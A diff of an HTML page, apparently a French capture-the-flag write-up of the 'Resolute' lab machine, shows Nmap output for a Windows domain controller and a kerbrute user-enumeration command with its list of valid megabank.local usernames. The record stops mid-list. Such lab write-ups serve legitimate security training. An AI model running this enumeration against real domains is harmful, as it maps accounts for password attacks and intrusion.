@@ -7673,363 +7673,363 @@
 </table>
 <hr />
 <h3 id="nmap">Nmap</h3>
-<pre><code class="language-bash">PORT      STATE SERVICE      REASON  VERSION
-53/tcp    open  domain       syn-ack Simple DNS Plus
-88/tcp    open  kerberos-sec syn-ack Microsoft Windows Kerberos (server time: 2024-03-18 22:51:36Z)
-135/tcp   open  msrpc        syn-ack Microsoft Windows RPC
-139/tcp   open  netbios-ssn  syn-ack Microsoft Windows netbios-ssn
-389/tcp   open  ldap         syn-ack Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
-445/tcp   open  microsoft-ds syn-ack Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
-464/tcp   open  kpasswd5?    syn-ack
-593/tcp   open  ncacn_http   syn-ack Microsoft Windows RPC over HTTP 1.0
-636/tcp   open  tcpwrapped   syn-ack
-3268/tcp  open  ldap         syn-ack Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
-3269/tcp  open  tcpwrapped   syn-ack
-5985/tcp  open  http         syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
-|_http-title: Not Found
-|_http-server-header: Microsoft-HTTPAPI/2.0
-9389/tcp  open  mc-nmf       syn-ack .NET Message Framing
-47001/tcp open  http         syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
-|_http-title: Not Found
-|_http-server-header: Microsoft-HTTPAPI/2.0
-49664/tcp open  msrpc        syn-ack Microsoft Windows RPC
-49665/tcp open  msrpc        syn-ack Microsoft Windows RPC
-49666/tcp open  msrpc        syn-ack Microsoft Windows RPC
-49667/tcp open  msrpc        syn-ack Microsoft Windows RPC
-49671/tcp open  msrpc        syn-ack Microsoft Windows RPC
-49676/tcp open  ncacn_http   syn-ack Microsoft Windows RPC over HTTP 1.0
-49677/tcp open  msrpc        syn-ack Microsoft Windows RPC
-49686/tcp open  msrpc        syn-ack Microsoft Windows RPC
-49706/tcp open  msrpc        syn-ack Microsoft Windows RPC
-49750/tcp open  msrpc        syn-ack Microsoft Windows RPC
-Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>PORT<span class="w">      </span>STATE<span class="w"> </span>SERVICE<span class="w">      </span>REASON<span class="w">  </span>VERSION
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="m">53</span>/tcp<span class="w">    </span>open<span class="w">  </span>domain<span class="w">       </span>syn-ack<span class="w"> </span>Simple<span class="w"> </span>DNS<span class="w"> </span>Plus
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="m">88</span>/tcp<span class="w">    </span>open<span class="w">  </span>kerberos-sec<span class="w"> </span>syn-ack<span class="w"> </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Kerberos<span class="w"> </span><span class="o">(</span>server<span class="w"> </span>time:<span class="w"> </span><span class="m">2024</span>-03-18<span class="w"> </span><span class="m">22</span>:51:36Z<span class="o">)</span>
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="m">135</span>/tcp<span class="w">   </span>open<span class="w">  </span>msrpc<span class="w">        </span>syn-ack<span class="w"> </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="m">139</span>/tcp<span class="w">   </span>open<span class="w">  </span>netbios-ssn<span class="w">  </span>syn-ack<span class="w"> </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>netbios-ssn
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="m">389</span>/tcp<span class="w">   </span>open<span class="w">  </span>ldap<span class="w">         </span>syn-ack<span class="w"> </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Active<span class="w"> </span>Directory<span class="w"> </span>LDAP<span class="w"> </span><span class="o">(</span>Domain:<span class="w"> </span>megabank.local,<span class="w"> </span>Site:<span class="w"> </span>Default-First-Site-Name<span class="o">)</span>
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="m">445</span>/tcp<span class="w">   </span>open<span class="w">  </span>microsoft-ds<span class="w"> </span>syn-ack<span class="w"> </span>Windows<span class="w"> </span>Server<span class="w"> </span><span class="m">2016</span><span class="w"> </span>Standard<span class="w"> </span><span class="m">14393</span><span class="w"> </span>microsoft-ds<span class="w"> </span><span class="o">(</span>workgroup:<span class="w"> </span>MEGABANK<span class="o">)</span>
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a><span class="m">464</span>/tcp<span class="w">   </span>open<span class="w">  </span>kpasswd5?<span class="w">    </span>syn-ack
+</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a><span class="m">593</span>/tcp<span class="w">   </span>open<span class="w">  </span>ncacn_http<span class="w">   </span>syn-ack<span class="w"> </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC<span class="w"> </span>over<span class="w"> </span>HTTP<span class="w"> </span><span class="m">1</span>.0
+</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a><span class="m">636</span>/tcp<span class="w">   </span>open<span class="w">  </span>tcpwrapped<span class="w">   </span>syn-ack
+</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a><span class="m">3268</span>/tcp<span class="w">  </span>open<span class="w">  </span>ldap<span class="w">         </span>syn-ack<span class="w"> </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Active<span class="w"> </span>Directory<span class="w"> </span>LDAP<span class="w"> </span><span class="o">(</span>Domain:<span class="w"> </span>megabank.local,<span class="w"> </span>Site:<span class="w"> </span>Default-First-Site-Name<span class="o">)</span>
+</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a><span class="m">3269</span>/tcp<span class="w">  </span>open<span class="w">  </span>tcpwrapped<span class="w">   </span>syn-ack
+</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a><span class="m">5985</span>/tcp<span class="w">  </span>open<span class="w">  </span>http<span class="w">         </span>syn-ack<span class="w"> </span>Microsoft<span class="w"> </span>HTTPAPI<span class="w"> </span>httpd<span class="w"> </span><span class="m">2</span>.0<span class="w"> </span><span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a><span class="p">|</span>_http-title:<span class="w"> </span>Not<span class="w"> </span>Found
+</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a><span class="p">|</span>_http-server-header:<span class="w"> </span>Microsoft-HTTPAPI/2.0
+</span><span id="__span-0-16"><a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a><span class="m">9389</span>/tcp<span class="w">  </span>open<span class="w">  </span>mc-nmf<span class="w">       </span>syn-ack<span class="w"> </span>.NET<span class="w"> </span>Message<span class="w"> </span>Framing
+</span><span id="__span-0-17"><a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a><span class="m">47001</span>/tcp<span class="w"> </span>open<span class="w">  </span>http<span class="w">         </span>syn-ack<span class="w"> </span>Microsoft<span class="w"> </span>HTTPAPI<span class="w"> </span>httpd<span class="w"> </span><span class="m">2</span>.0<span class="w"> </span><span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+</span><span id="__span-0-18"><a id="__codelineno-0-18" name="__codelineno-0-18" href="#__codelineno-0-18"></a><span class="p">|</span>_http-title:<span class="w"> </span>Not<span class="w"> </span>Found
+</span><span id="__span-0-19"><a id="__codelineno-0-19" name="__codelineno-0-19" href="#__codelineno-0-19"></a><span class="p">|</span>_http-server-header:<span class="w"> </span>Microsoft-HTTPAPI/2.0
+</span><span id="__span-0-20"><a id="__codelineno-0-20" name="__codelineno-0-20" href="#__codelineno-0-20"></a><span class="m">49664</span>/tcp<span class="w"> </span>open<span class="w">  </span>msrpc<span class="w">        </span>syn-ack<span class="w"> </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
+</span><span id="__span-0-21"><a id="__codelineno-0-21" name="__codelineno-0-21" href="#__codelineno-0-21"></a><span class="m">49665</span>/tcp<span class="w"> </span>open<span class="w">  </span>msrpc<span class="w">        </span>syn-ack<span class="w"> </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
+</span><span id="__span-0-22"><a id="__codelineno-0-22" name="__codelineno-0-22" href="#__codelineno-0-22"></a><span class="m">49666</span>/tcp<span class="w"> </span>open<span class="w">  </span>msrpc<span class="w">        </span>syn-ack<span class="w"> </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
+</span><span id="__span-0-23"><a id="__codelineno-0-23" name="__codelineno-0-23" href="#__codelineno-0-23"></a><span class="m">49667</span>/tcp<span class="w"> </span>open<span class="w">  </span>msrpc<span class="w">        </span>syn-ack<span class="w"> </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
+</span><span id="__span-0-24"><a id="__codelineno-0-24" name="__codelineno-0-24" href="#__codelineno-0-24"></a><span class="m">49671</span>/tcp<span class="w"> </span>open<span class="w">  </span>msrpc<span class="w">        </span>syn-ack<span class="w"> </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
+</span><span id="__span-0-25"><a id="__codelineno-0-25" name="__codelineno-0-25" href="#__codelineno-0-25"></a><span class="m">49676</span>/tcp<span class="w"> </span>open<span class="w">  </span>ncacn_http<span class="w">   </span>syn-ack<span class="w"> </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC<span class="w"> </span>over<span class="w"> </span>HTTP<span class="w"> </span><span class="m">1</span>.0
+</span><span id="__span-0-26"><a id="__codelineno-0-26" name="__codelineno-0-26" href="#__codelineno-0-26"></a><span class="m">49677</span>/tcp<span class="w"> </span>open<span class="w">  </span>msrpc<span class="w">        </span>syn-ack<span class="w"> </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
+</span><span id="__span-0-27"><a id="__codelineno-0-27" name="__codelineno-0-27" href="#__codelineno-0-27"></a><span class="m">49686</span>/tcp<span class="w"> </span>open<span class="w">  </span>msrpc<span class="w">        </span>syn-ack<span class="w"> </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
+</span><span id="__span-0-28"><a id="__codelineno-0-28" name="__codelineno-0-28" href="#__codelineno-0-28"></a><span class="m">49706</span>/tcp<span class="w"> </span>open<span class="w">  </span>msrpc<span class="w">        </span>syn-ack<span class="w"> </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
+</span><span id="__span-0-29"><a id="__codelineno-0-29" name="__codelineno-0-29" href="#__codelineno-0-29"></a><span class="m">49750</span>/tcp<span class="w"> </span>open<span class="w">  </span>msrpc<span class="w">        </span>syn-ack<span class="w"> </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
+</span><span id="__span-0-30"><a id="__codelineno-0-30" name="__codelineno-0-30" href="#__codelineno-0-30"></a>Service<span class="w"> </span>Info:<span class="w"> </span>Host:<span class="w"> </span>RESOLUTE<span class="p">;</span><span class="w"> </span>OS:<span class="w"> </span>Windows<span class="p">;</span><span class="w"> </span>CPE:<span class="w"> </span>cpe:/o:microsoft:windows
+</span></code></pre></div>
 <p>Enumération des utilisateurs :</p>
-<pre><code class="language-bash">pak@DESKTOP-AF1CU53:~$ Downloads/kerbrute_linux_amd64 userenum --dc 10.129.167.19 -d megabank.local /usr/share/wordlists/secl
-ists/Usernames/xato-net-10-million-usernames.txt
-
-    __             __               __
-   / /_____  _____/ /_  _______  __/ /____
-  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
- / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
-/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/
-
-Version: v1.0.3 (9dad6e1) - 03/18/24 - Ronnie Flathers @ropnop
-
-2024/03/18 23:49:16 &gt;  Using KDC(s):
-2024/03/18 23:49:16 &gt;   10.129.167.19:88
-
-2024/03/18 23:49:16 &gt;  [+] VALID USERNAME:       steve@megabank.local
-2024/03/18 23:49:17 &gt;  [+] VALID USERNAME:       fred@megabank.local
-2024/03/18 23:49:17 &gt;  [+] VALID USERNAME:       marcus@megabank.local
-2024/03/18 23:49:17 &gt;  [+] VALID USERNAME:       simon@megabank.local
-2024/03/18 23:49:17 &gt;  [+] VALID USERNAME:       ryan@megabank.local
-2024/03/18 23:49:17 &gt;  [+] VALID USERNAME:       stevie@megabank.local
-2024/03/18 23:49:18 &gt;  [+] VALID USERNAME:       angela@megabank.local
-2024/03/18 23:49:19 &gt;  [+] VALID USERNAME:       Steve@megabank.local
-2024/03/18 23:49:20 &gt;  [+] VALID USERNAME:       claire@megabank.local
-2024/03/18 23:49:21 &gt;  [+] VALID USERNAME:       sally@megabank.local
-2024/03/18 23:49:22 &gt;  [+] VALID USERNAME:       claude@megabank.local
-2024/03/18 23:49:24 &gt;  [+] VALID USERNAME:       melanie@megabank.local
-2024/03/18 23:49:25 &gt;  [+] VALID USERNAME:       administrator@megabank.local
-2024/03/18 23:49:26 &gt;  [+] VALID USERNAME:       gustavo@megabank.local
-2024/03/18 23:49:27 &gt;  [+] VALID USERNAME:       STEVE@megabank.local
-2024/03/18 23:49:28 &gt;  [+] VALID USERNAME:       marko@megabank.local
-2024/03/18 23:49:29 &gt;  [+] VALID USERNAME:       Marcus@megabank.local
-2024/03/18 23:49:33 &gt;  [+] VALID USERNAME:       Angela@megabank.local
-2024/03/18 23:49:35 &gt;  [+] VALID USERNAME:       Ryan@megabank.local
-2024/03/18 23:49:35 &gt;  [+] VALID USERNAME:       Fred@megabank.local
-2024/03/18 23:49:36 &gt;  [+] VALID USERNAME:       paulo@megabank.local
-2024/03/18 23:49:38 &gt;  [+] VALID USERNAME:       felicia@megabank.local
-2024/03/18 23:49:39 &gt;  [+] VALID USERNAME:       annette@megabank.local
-2024/03/18 23:49:39 &gt;  [+] VALID USERNAME:       abigail@megabank.local
-2024/03/18 23:49:42 &gt;  [+] VALID USERNAME:       Stevie@megabank.local
-2024/03/18 23:49:42 &gt;  [+] VALID USERNAME:       FRED@megabank.local
-2024/03/18 23:49:44 &gt;  [+] VALID USERNAME:       Simon@megabank.local
-2024/03/18 23:49:53 &gt;  [+] VALID USERNAME:       Annette@megabank.local
-2024/03/18 23:50:05 &gt;  [+] VALID USERNAME:       annika@megabank.local
-2024/03/18 23:50:06 &gt;  [+] VALID USERNAME:       Claude@megabank.local
-2024/03/18 23:50:19 &gt;  [+] VALID USERNAME:       per@megabank.local
-2024/03/18 23:50:23 &gt;  [+] VALID USERNAME:       Administrator@megabank.local
-2024/03/18 23:50:35 &gt;  [+] VALID USERNAME:       Sally@megabank.local
-2024/03/18 23:50:36 &gt;  [+] VALID USERNAME:       MARCUS@megabank.local
-2024/03/18 23:50:45 &gt;  [+] VALID USERNAME:       Claire@megabank.local
-2024/03/18 23:50:45 &gt;  [+] VALID USERNAME:       ANGELA@megabank.local
-2024/03/18 23:50:48 &gt;  [+] VALID USERNAME:       naoki@megabank.local
-2024/03/18 23:50:55 &gt;  [+] VALID USERNAME:       Melanie@megabank.local
-2024/03/18 23:50:55 &gt;  [+] VALID USERNAME:       Marko@megabank.local
-2024/03/18 23:51:07 &gt;  [+] VALID USERNAME:       SIMON@megabank.local
-2024/03/18 23:51:09 &gt;  [+] VALID USERNAME:       zach@megabank.local
-2024/03/18 23:51:44 &gt;  [+] VALID USERNAME:       Paulo@megabank.local
-2024/03/18 23:51:45 &gt;  [+] VALID USERNAME:       CLAUDE@megabank.local
-2024/03/18 23:52:11 &gt;  [+] VALID USERNAME:       Felicia@megabank.local
-2024/03/18 23:52:15 &gt;  [+] VALID USERNAME:       ulf@megabank.local
-2024/03/18 23:52:44 &gt;  [+] VALID USERNAME:       RYAN@megabank.local
-2024/03/18 23:53:39 &gt;  [+] VALID USERNAME:       MELANIE@megabank.local
-2024/03/18 23:53:40 &gt;  [+] VALID USERNAME:       Gustavo@megabank.local
-2024/03/18 23:54:01 &gt;  [+] VALID USERNAME:       resolute@megabank.local
-2024/03/18 23:55:08 &gt;  [+] VALID USERNAME:       ANNETTE@megabank.local
-2024/03/18 23:57:11 &gt;  [+] VALID USERNAME:       STEVIE@megabank.local
-2024/03/18 23:57:13 &gt;  [+] VALID USERNAME:       PAULO@megabank.local
-2024/03/18 23:57:15 &gt;  [+] VALID USERNAME:       MARKO@megabank.local
-2024/03/18 23:57:18 &gt;  [+] VALID USERNAME:       GUSTAVO@megabank.local
-2024/03/18 23:57:21 &gt;  [+] VALID USERNAME:       CLAIRE@megabank.local
-2024/03/18 23:57:23 &gt;  [+] VALID USERNAME:       Annika@megabank.local
-2024/03/19 00:03:22 &gt;  [+] VALID USERNAME:       Ulf@megabank.local
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>pak@DESKTOP-AF1CU53:~$<span class="w"> </span>Downloads/kerbrute_linux_amd64<span class="w"> </span>userenum<span class="w"> </span>--dc<span class="w"> </span><span class="m">10</span>.129.167.19<span class="w"> </span>-d<span class="w"> </span>megabank.local<span class="w"> </span>/usr/share/wordlists/secl
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>ists/Usernames/xato-net-10-million-usernames.txt
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="w">    </span>__<span class="w">             </span>__<span class="w">               </span>__
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="w">   </span>/<span class="w"> </span>/_____<span class="w">  </span>_____/<span class="w"> </span>/_<span class="w">  </span>_______<span class="w">  </span>__/<span class="w"> </span>/____
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a><span class="w">  </span>/<span class="w"> </span>//_/<span class="w"> </span>_<span class="w"> </span><span class="se">\/</span><span class="w"> </span>___/<span class="w"> </span>__<span class="w"> </span><span class="se">\/</span><span class="w"> </span>___/<span class="w"> </span>/<span class="w"> </span>/<span class="w"> </span>/<span class="w"> </span>__/<span class="w"> </span>_<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a><span class="w"> </span>/<span class="w"> </span>,&lt;<span class="w"> </span>/<span class="w">  </span>__/<span class="w"> </span>/<span class="w">  </span>/<span class="w"> </span>/_/<span class="w"> </span>/<span class="w"> </span>/<span class="w">  </span>/<span class="w"> </span>/_/<span class="w"> </span>/<span class="w"> </span>/_/<span class="w">  </span>__/
+</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>/_/<span class="p">|</span>_<span class="p">|</span><span class="se">\_</span>__/_/<span class="w">  </span>/_.___/_/<span class="w">   </span><span class="se">\_</span>_,_/<span class="se">\_</span>_/<span class="se">\_</span>__/
+</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a>
+</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a>Version:<span class="w"> </span>v1.0.3<span class="w"> </span><span class="o">(</span>9dad6e1<span class="o">)</span><span class="w"> </span>-<span class="w"> </span><span class="m">03</span>/18/24<span class="w"> </span>-<span class="w"> </span>Ronnie<span class="w"> </span>Flathers<span class="w"> </span>@ropnop
+</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a>
+</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a><span class="m">2024</span>/03/18<span class="w"> </span><span class="m">23</span>:49:16<span class="w"> </span>&gt;<span class="w">  </span>Using<span class="w"> </span>KDC<span class="o">(</span>s<span class="o">)</span>:
+</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a><span class="m">2024</span>/03/18<span class="w"> </span><span class="m">23</span>:49:16<span class="w"> </span>&gt;<span class="w">   </span><span class="m">10</span>.129.167.19:88
+</span><span id="__span-1-14"><a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a>
+</span><span id="__span-1-15"><a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a><span class="m">2024</span>/03/18<span class="w"> </span><span class="m">23</span>:49:16<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">       </span>steve@megabank.local
+</span><span id="__span-1-16"><a id="__codelineno-1-16" name="__codelineno-1-16" href="#__codelineno-1-16"></a><span class="m">2024</span>/03/18<span class="w"> </span><span class="m">23</span>:49:17<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">       </span>fred@megabank.local
+</span><span id="__span-1-17"><a id="__codelineno-1-17" name="__codelineno-1-17" href="#__codelineno-1-17"></a><span class="m">2024</span>/03/18<span class="w"> </span><span class="m">23</span>:49:17<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">       </span>marcus@megabank.local
+</span><span id="__span-1-18"><a id="__codelineno-1-18" name="__codelineno-1-18" href="#__codelineno-1-18"></a><span class="m">2024</span>/03/18<span class="w"> </span><span class="m">23</span>:49:17<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">       </span>simon@megabank.local
+</span><span id="__span-1-19"><a id="__codelineno-1-19" name="__codelineno-1-19" href="#__codelineno-1-19"></a><span class="m">2024</span>/03/18<span class="w"> </span><span class="m">23</span>:49:17<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">       </span>ryan@megabank.local
+</span><span id="__span-1-20"><a id="__codelineno-1-20" name="__codelineno-1-20" href="#__codelineno-1-20"></a><span class="m">2024</span>/03/18<span class="w"> </span><span class="m">23</span>:49:17<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">       </span>stevie@megabank.local
+</span><span id="__span-1-21"><a id="__codelineno-1-21" name="__codelineno-1-21" href="#__codelineno-1-21"></a><span class="m">2024</span>/03/18<span class="w"> </span><span class="m">23</span>:49:18<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">       </span>angela@megabank.local
+</span><span id="__span-1-22"><a id="__codelineno-1-22" name="__codelineno-1-22" href="#__codelineno-1-22"></a><span class="m">2024</span>/03/18<span class="w"> </span><span class="m">23</span>:49:19<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">       </span>Steve@megabank.local
+</span><span id="__span-1-23"><a id="__codelineno-1-23" name="__codelineno-1-23" href="#__codelineno-1-23"></a><span class="m">2024</span>/03/18<span class="w"> </span><span class="m">23</span>:49:20<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">       </span>claire@megabank.local
+</span><span id="__span-1-24"><a id="__codelineno-1-24" name="__codelineno-1-24" href="#__codelineno-1-24"></a><span class="m">2024</span>/03/18<span class="w"> </span><span class="m">23</span>:49:21<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">       </span>sally@megabank.local
+</span><span id="__span-1-25"><a id="__codelineno-1-25" name="__codelineno-1-25" href="#__codelineno-1-25"></a><span class="m">2024</span>/03/18<span class="w"> </span><span class="m">23</span>:49:22<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">       </span>claude@megabank.local
+</span><span id="__span-1-26"><a id="__codelineno-1-26" name="__codelineno-1-26" href="#__codelineno-1-26"></a><span class="m">2024</span>/03/18<span class="w"> </span><span class="m">23</span>:49:24<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">       </span>melanie@megabank.local
+</span><span id="__span-1-27"><a id="__codelineno-1-27" name="__codelineno-1-27" href="#__codelineno-1-27"></a><span class="m">2024</span>/03/18<span class="w"> </span><span class="m">23</span>:49:25<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">       </span>administrator@megabank.local
+</span><span id="__span-1-28"><a id="__codelineno-1-28" name="__codelineno-1-28" href="#__codelineno-1-28"></a><span class="m">2024</span>/03/18<span class="w"> </span><span class="m">23</span>:49:26<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">       </span>gustavo@megabank.local
+</span><span id="__span-1-29"><a id="__codelineno-1-29" name="__codelineno-1-29" href="#__codelineno-1-29"></a><span class="m">2024</span>/03/18<span class="w"> </span><span class="m">23</span>:49:27<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">       </span>STEVE@megabank.local
+</span><span id="__span-1-30"><a id="__codelineno-1-30" name="__codelineno-1-30" href="#__codelineno-1-30"></a><span class="m">2024</span>/03/18<span class="w"> </span><span class="m">23</span>:49:28<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">       </span>marko@megabank.local
+</span><span id="__span-1-31"><a id="__codelineno-1-31" name="__codelineno-1-31" href="#__codelineno-1-31"></a><span class="m">2024</span>/03/18<span class="w"> </span><span class="m">23</span>:49:29<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">       </span>Marcus@megabank.local
+</span><span id="__span-1-32"><a id="__codelineno-1-32" name="__codelineno-1-32" href="#__codelineno-1-32"></a><span class="m">2024</span>/03/18<span class="w"> </span><span class="m">23</span>:49:33<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">       </span>Angela@megabank.local
+</span><span id="__span-1-33"><a id="__codelineno-1-33" name="__codelineno-1-33" href="#__codelineno-1-33"></a><span class="m">2024</span>/03/18<span class="w"> </span><span class="m">23</span>:49:35<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">       </span>Ryan@megabank.local
+</span><span id="__span-1-34"><a id="__codelineno-1-34" name="__codelineno-1-34" href="#__codelineno-1-34"></a><span class="m">2024</span>/03/18<span class="w"> </span><span class="m">23</span>:49:35<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">       </span>Fred@megabank.local
+</span><span id="__span-1-35"><a id="__codelineno-1-35" name="__codelineno-1-35" href="#__codelineno-1-35"></a><span class="m">2024</span>/03/18<span class="w"> </span><span class="m">23</span>:49:36<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">       </span>paulo@megabank.local
+</span><span id="__span-1-36"><a id="__codelineno-1-36" name="__codelineno-1-36" href="#__codelineno-1-36"></a><span class="m">2024</span>/03/18<span class="w"> </span><span class="m">23</span>:49:38<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">       </span>felicia@megabank.local
+</span><span id="__span-1-37"><a id="__codelineno-1-37" name="__codelineno-1-37" href="#__codelineno-1-37"></a><span class="m">2024</span>/03/18<span class="w"> </span><span class="m">23</span>:49:39<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">       </span>annette@megabank.local
